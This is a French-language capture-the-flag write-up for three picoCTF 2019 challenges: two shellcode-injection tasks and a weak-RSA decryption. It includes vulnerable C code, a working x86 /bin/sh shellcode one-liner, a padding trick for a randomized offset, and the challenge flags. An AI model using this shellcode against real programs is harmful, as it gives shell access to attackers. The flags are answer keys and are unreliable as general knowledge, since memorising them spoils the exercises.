# Binary_Exploitation_50_Handy_shellcode

------

### Titre : Handy_shellcode

### Points : 50

------

### Description 

Ce programme exécute n'importe quel shellcode que vous lui donnez. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt ? (Merci à google translate :))

------

#### Hints

* vous pourrez peut-être trouver un bon shellcode en ligne. 

------





### Résolution

---

On se connecte vite en ssh sur le serveur shell puis une fois sur le serveur on trouve les trois fichiers suivants : flag.txt, vuln.c vuln. Je commence d'abord par analyser le programme c :
```c
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```

Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit donc essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) aprés quelques recherches concernant le shellcode j'ai trouvé ce payload :
```bash
$ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
...
```

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/handy_shell.png)


`picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`

# Binary_Exploitation_200_slippery_shellcode

------

### Titre : slippery-shellcode

### Points : 200

------

### Description 

Ce programme est un peu plus compliqué. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt? Vous pouvez trouver le programme dans /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 sur le serveur shell

------


### Résolution

Comme pour le handy shellcode je commence à analyser le code C ci-dessous :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```
Je comprends vite que ce code est presque le même qu'avec le handy-shellcode sauf qu'ici notre shellcode aprés  un offset qui est modulo 256. Pour un début je tente donc de lui envoyé mon shellcode directement :  

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery1.png)

Mon shellcode est effectivement executé mais pas à la bonne adresse est donc j'ai un segmentation fault.
Je tente aprés d'executé mon shellcode en remplissant le buffer de 256  caractères suivi de mon shellcode.

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/slippery2.png)

Et Hop j'ai effectivément un shell et le flag.


`picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}`

# Crypto_400_b00tl3gRSA2

------

### Titre : b00tl3gRSA2

### Points : 400

------

### Description 

Connectez-vous sur  `nc 2019shell1.picoctf.com 10814`,...
En RSA, d est beaucoup plus gros que e, pourquoi ne pas utiliser d pour chiffrer au lieu de e?

------

#### Hints

* Qu'est-ce que e en général ?. 

------


### Résolution

une fois connecter au serveur il nous renvoi les paramétres suivants :

```bash
c: 3246567211807903956035755386967723378469000089645359852430311338899740839190191186912796367655591221991073923539783802534343637991859596366133917926183487070028511851491672546150628697450709648276484740441059116769268880830587810651048199357915546440564242235096147024745525549383938798867512940345819471689
n: 92862994629391715025973326227583472781928051965578118595096998621079516709489523781529594005972923927674610395292210963782547003449976221876961532867478284466283591394095929545356891486644591390877842583027695288887951335923580147704761840841012240495813817062197826156384498734601243045712509995933135061613
e: 55534726162469284328134833374089125970705191581654686697554612920273578259533132513991933989595141790093397702407611338686991542277109389566561688171186896367716544979539952509680212727662952068636577177373930069448696402121437219985978915997070443631144215446467780163599410246770789910349000677632900578365
...
```
En se basant sur l'enoncé du challenge, l'hint et connaissant un peu la cryptographie RSA on comprends vite que dans cette configuration la clé privé d pour dechiffré le chiffré c est la valeur de e par défaut qui est généralement 65537.

Maintenant je connais tous les paramétres pour dechiffré le message chiffré, j'ai tous simplement converti ces diffèrents paramètres en hexadecimal puis sur le site : [https://nmichaels.org/rsa.py](https://nmichaels.org/rsa.py) j'ai reussi à dechiffré le message.(Une autre méthode était d'utiliser [RsaCtftool](https://github.com/Ganapati/RsaCtfTool) qui est trés bien manipuler RSA )

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/rsadecryp.png)

Puis ensuite avec python je converti la chaine hexadecimal dechiffré en utf-8 et bingo flag.
![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/rsa2.png)

`picoCTF{bad_1d3a5_4986370}`









